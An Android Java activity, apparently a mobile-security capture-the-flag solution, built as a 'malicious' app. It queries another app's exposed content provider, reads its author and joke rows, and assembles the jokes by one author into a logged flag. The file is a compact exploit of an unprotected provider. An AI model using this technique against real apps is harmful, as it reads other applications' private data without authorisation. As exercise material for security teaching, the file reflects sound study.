package com.example.maliciousapp;

import androidx.appcompat.app.AppCompatActivity;

import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MOBIOTSEC";
    static final String PROVIDER_NAME = "com.example.victimapp.MyProvider";
    static final String TABLE_NAME = "joke";
    static final String URL = "content://" + PROVIDER_NAME + "/" + TABLE_NAME;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Uri contentUri = Uri.parse(URL);

        String[] projection = { "author", "joke" };

        Log.i(TAG,"Cursor Query Start");

        Cursor cursor = getContentResolver().query(
                contentUri,
                projection,
                null,
                null,
                null
        );

        Log.i(TAG,"Cursor Query Done");
        StringBuilder stringBuilder = new StringBuilder();

        if (cursor == null) {
            Log.e(TAG,"Null Cursor Error");
        }
        else if (cursor.getCount() < 1) {
            Log.d(TAG,"Unsuccessful Cursor Search");
        } else {
            while (cursor.moveToNext()) {
                int authorIndex = cursor.getColumnIndex("author");
                String authorValue = cursor.getString(authorIndex);
                Log.i(TAG,"Author: " + authorValue);

                int jokeIndex = cursor.getColumnIndex("joke");
                String jokeValue = cursor.getString(jokeIndex);
                Log.i(TAG,"Joke: " + jokeValue);

                if (authorValue.equals("elosiouk")) {
                    stringBuilder.append(jokeValue);
                }
            }
        }
        Log.i(TAG,"Flag: " + stringBuilder.toString());
    }
}